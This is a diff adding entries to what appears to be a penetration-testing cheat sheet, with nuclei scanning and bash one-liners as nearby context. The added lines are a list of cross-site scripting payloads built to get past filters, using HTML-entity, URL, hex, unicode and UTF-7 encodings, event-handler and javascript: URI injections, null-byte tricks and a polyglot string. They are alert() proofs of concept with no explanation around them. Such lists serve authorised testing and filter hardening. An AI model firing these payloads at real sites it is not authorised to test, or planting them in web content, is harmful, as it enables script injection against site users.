@@ -241,6 +241,21 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 • <meter onmouseover="alert(1)"
 • '">><div><meter onmouseover="alert(1)"</div>"
 • <marquee loop=1 width=0 onfinish=alert(1)>
+• &#60;script&#62;alert(1)&#60;/script&#62;
+• %3Cscript%3Ealert(1)%3C/script%3E
+• \\x3cscript\\x3ealert(1)\\x3c/script\\x3e
+• \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
+• %26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
+• <input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>	
+• <a href="javascript:alert(1)">ssss</a>
+• +ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
+• +ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-
+• +ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-
+• <%00script>alert(‘XSS’)<%00/script>
+• <%script>alert(‘XSS’)<%/script>
+• <IMG SRC="javascript:alert('XSS');">
+• <BASE HREF="javascript:alert('XSS');//">
+• /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 ```
 
 - Bash One liners and More.
